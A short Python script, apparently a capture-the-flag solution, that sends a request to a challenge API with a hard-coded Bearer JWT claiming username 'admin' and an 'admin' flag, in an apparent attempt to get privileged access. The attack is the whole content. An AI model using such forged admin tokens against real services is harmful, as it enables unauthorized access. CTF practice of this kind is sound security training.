import requests

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'en-US,en;q=0.9',
    'Authorization':'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjIxMzY2MTA2fQ.3J6da0lNgnQDI4EV37Og1ScqWZFb-fea0c1oIQ3wdRXfRGNMoAf3yQhHzX26fkUEgCS--z0adx5Mvsmc4WW-Xg'
}

data = {
    'admin':'1'
}

response = requests.get('http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/', headers=headers, data=data,  verify=False)
print(response.text)

